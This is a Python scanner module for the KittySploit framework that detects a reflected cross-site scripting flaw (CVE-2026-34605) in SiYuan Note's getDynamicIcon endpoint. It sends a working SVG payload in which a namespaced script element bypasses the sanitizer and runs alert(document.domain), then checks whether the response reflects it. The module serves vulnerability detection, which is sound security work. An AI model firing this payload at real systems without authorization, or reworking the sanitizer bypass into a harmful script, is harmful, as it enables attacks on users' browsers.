#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SiYuan Note through version 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SiYuan Note - Cross-Site Scripting Detection',
        'description': 'SiYuan Note through version 3.6.1 is vulnerable to unauthenticated reflected Cross-Site Scripting (XSS) in the `/api/icon/getDynamicIcon` endpoint due to improper filtering of SVG elements with a namespace prefix (such as `<x:script>`). By using a namespaced script element, attackers can bypass the `SanitizeSVG` function and execute arbitrary JavaScript in the victim’s browser upon visiting a crafted link.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'siyuan', 'xss', 'svg'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/siyuan-note/siyuan/security/advisories/GHSA-73g7-86qr-jrg3',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-34605',
        ],
        'cve': 'CVE-2026-34605',
    }

    def run(self):
        path = '/api/icon/getDynamicIcon?type=8&color=red&content=%3C%2Ftext%3E%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E%3Ctext%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('</text><x:script xmlns:x="http://www.w3.org/2000/svg">alert(document.domain)</x:script><text>', 'id="dynamic_icon_type8',)
        ctype_any = ('image/svg+xml',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='SiYuan Note - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

